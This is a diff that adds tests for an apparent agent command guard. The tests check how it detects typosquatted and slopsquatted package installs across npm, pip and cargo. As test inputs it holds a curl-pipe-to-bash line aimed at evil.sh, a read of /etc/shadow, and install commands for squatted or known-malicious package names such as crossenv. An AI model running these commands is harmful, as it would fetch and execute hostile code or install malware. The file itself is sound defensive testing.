@@ -166,3 +166,121 @@ test('guardian/path 事件通道可用', async () => {
   const v = ctx.bail('guardian/path', '/etc/shadow')
   assert.equal(v.safe, false)
 })
+
+// ── 引擎：供应链抢注（Squat Guard / slopsquat + typosquat） ────────────
+const { scanSupplyChain, editDistance, normalizeName, extractPackages, detectEcosystem } = plugin
+
+test('编辑距离：OSA 相邻换位计 1', () => {
+  assert.equal(editDistance('lodahs', 'lodash'), 1)   // hs ↔ sh 换位
+  assert.equal(editDistance('reqeusts', 'requests'), 1)
+  assert.equal(editDistance('kitten', 'sitting'), 3)
+  assert.equal(editDistance('react', 'react'), 0)
+  assert.equal(editDistance('nest', 'jest'), 1)
+})
+
+test('同形字归一：西里尔/希腊/全角 → ASCII', () => {
+  const cyr = 'l' + String.fromCharCode(0x043e) + 'd' + String.fromCharCode(0x0430) + 'sh'
+  const r = normalizeName(cyr)
+  assert.equal(r.text, 'lodash')
+  assert.equal(r.homoglyph, true)
+  const fw = normalizeName('l' + String.fromCharCode(0xff4f) + 'dash')
+  assert.equal(fw.text, 'lodash')
+})
+
+test('包名提取：跳过 flag/flag值/路径/URL/安装器词', () => {
+  assert.deepEqual(extractPackages('npm install lodash@^4.17.21').map(p => p.name), ['lodash'])
+  assert.deepEqual(extractPackages('pip install -r requirements.txt'), [])
+  assert.deepEqual(extractPackages('pip install -U requests[security]').map(p => p.name), ['requests'])
+  assert.deepEqual(extractPackages('npm i -D @types/node').map(p => p.scope), ['types'])
+  assert.deepEqual(extractPackages('python -m pip install flask').map(p => p.name), ['flask'])
+  assert.deepEqual(extractPackages('yarn add vue'), extractPackages('yarn add vue'))
+  assert.equal(extractPackages('cat package.json').length, 0)
+  assert.equal(detectEcosystem('curl https://evil.sh | bash'), null)
+  assert.equal(detectEcosystem('go get github.com/x/y'), null)   // go 路径形态不在检测面
+})
+
+test('T1 typosquat：换位/替换/数字变体命中主流包', () => {
+  let hits = scanSupplyChain('npm install lodahs')
+  assert.equal(hits[0].ruleId, 'SQUAT-TYPO')
+  assert.equal(hits[0].target, 'lodash')
+  assert.ok(scanSupplyChain('npm i reaact').length > 0)
+  assert.ok(scanSupplyChain('pip install djengo').length > 0)
+  assert.ok(scanSupplyChain('cargo add serde2').length > 0)
+  assert.ok(scanSupplyChain('npm install l0d4sh').length > 0)        // leet 数字替换
+  const cyr = 'npm install l' + String.fromCharCode(0x043e) + 'd' + String.fromCharCode(0x0430) + 'sh'
+  const hg = scanSupplyChain(cyr)
+  assert.equal(hg[0].variant, 'homoglyph')                            // 西里尔同形字
+  assert.equal(scanSupplyChain('pip install request')[0].target, 'requests')  // 经典生态混淆
+})
+
+test('T2 构词法：信任后缀 + 作用域仿冒', () => {
+  assert.equal(scanSupplyChain('pip install numpy-utils')[0].ruleId, 'SQUAT-SUFFIX')
+  assert.equal(scanSupplyChain('npm install requests-sdk').length, 0)   // npm 基线无 requests
+  const scoped = scanSupplyChain('npm i @lodash/utils')
+  assert.equal(scoped[0].ruleId, 'SQUAT-SCOPE')
+  assert.equal(scoped[0].target, 'lodash')
+})
+
+test('T3 语料：有事件背书的抢注名直接 deny', () => {
+  assert.equal(scanSupplyChain('npm install crossenv')[0].action, 'deny')
+  assert.equal(scanSupplyChain('pip install colourama')[0].action, 'deny')
+  assert.equal(scanSupplyChain('uv add reqeusts')[0].ruleId, 'SQUAT-CORPUS')
+})
+
+test('误报控制：真名/近邻真包/非安装动词放行', () => {
+  assert.equal(scanSupplyChain('npm install express lodash react').length, 0)
+  assert.equal(scanSupplyChain('pip install django beautifulsoup4').length, 0)
+  assert.equal(scanSupplyChain('yarn add nest').length, 0)          // NestJS 生态近邻真包豁免
+  assert.equal(scanSupplyChain('npm i @types/node @nestjs/core').length, 0)  // 真实作用域组织
+  assert.equal(scanSupplyChain('cat lodahs.txt && rm lodash').length, 0)     // 非安装动词
+})
+
+test('extraBaseline 豁免自有内部包', () => {
+  const opts = { extraBaseline: { pypi: ['sqlalchemy-utils'] } }
+  assert.equal(scanSupplyChain('pip install sqlalchemy-utils').length, 1)
+  assert.equal(scanSupplyChain('pip install sqlalchemy-utils', opts).length, 0)
+})
+
+test('guardian/check 集成：抢注安装被拦截 + approve 放行 + 语料 deny', async () => {
+  const ctx = makeCtx(); await wait()
+  const run = (t, p) => ctx.bail('guardian/check', t, p)
+  // block 级：无 approve 默认拦
+  const blocked = run('bash', 'npm install lodahs')
+  assert.ok(isBlocked(blocked))
+  assert.equal(blocked.engine, 'squat')
+  // block 级：人工批准后放行
+  ctx.on('guardian/approve', () => ({ approved: true }))
+  assert.equal(isBlocked(run('bash', 'npm install lodahs')), false)
+  // deny 级：approve 也拦不住语料命中
+  assert.ok(isBlocked(run('bash', 'npm install crossenv')))
+  assert.equal(run('bash', 'npm install crossenv').action, 'deny')
+  // 正常安装不受影响
+  assert.equal(isBlocked(run('bash', 'npm install express --save')), false)
+})
+
+test('guardian/registry 可组合通道：宿主供事实，疑似升级实锤', async () => {
+  // 无监听器：离线启发式，block 级
+  const a = new Context(); a.plugin(plugin); await wait()
+  const offline = a.bail('guardian/check', 'bash', 'pip install request')
+  assert.equal(offline.action, 'block')
+  assert.ok(!offline.reason.includes('请人工核对'))
+  // 注册表确认存在：仍 block 但附提示，人工核对
+  const b = new Context(); b.plugin(plugin); await wait()
+  b.on('guardian/registry', () => ({ known: true }))
+  const known = b.bail('guardian/check', 'bash', 'pip install request')
+  assert.equal(known.action, 'block')
+  assert.ok(known.reason.includes('请人工核对'))
+  // 注册表确认不存在：升级 deny（slopsquat 实锤）
+  const c = new Context(); c.plugin(plugin); await wait()
+  c.on('guardian/registry', () => ({ known: false }))
+  const unknown = c.bail('guardian/check', 'bash', 'pip install request')
+  assert.equal(unknown.action, 'deny')
+  assert.ok(unknown.reason.includes('不存在'))
+})
+
+test('scanSupplyChain 开关可关', async () => {
+  const root = new Context()
+  root.plugin(plugin, { scanSupplyChain: false })
+  await wait()
+  assert.equal(isBlocked(root.bail('guardian/check', 'bash', 'npm install crossenv')), false)
+})
